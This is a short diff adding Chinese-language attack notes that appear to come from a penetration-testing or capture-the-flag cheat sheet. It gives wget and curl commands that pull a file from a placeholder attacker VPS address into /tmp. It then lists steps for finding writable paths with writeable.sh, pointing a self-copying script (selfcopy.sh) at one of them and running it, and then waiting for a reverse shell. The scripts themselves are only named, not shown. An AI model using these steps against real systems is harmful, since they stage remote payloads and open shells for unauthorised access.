@@ -1,0 +1,6 @@
+传输文件使用wget或curl
+wget http://your-vps-ip:port/file -O /tmp/file  # 下载到临时目录
+curl http://your-vps-ip:port/file -o /tmp/file  # 替代方案
+1. 使用 writeable.sh 查找所有可写路径
+2. 本地修改 selfcopy.sh 中的 SOURCE_DIR 为可写路径并运行
+3. 远程等待反弹 shell
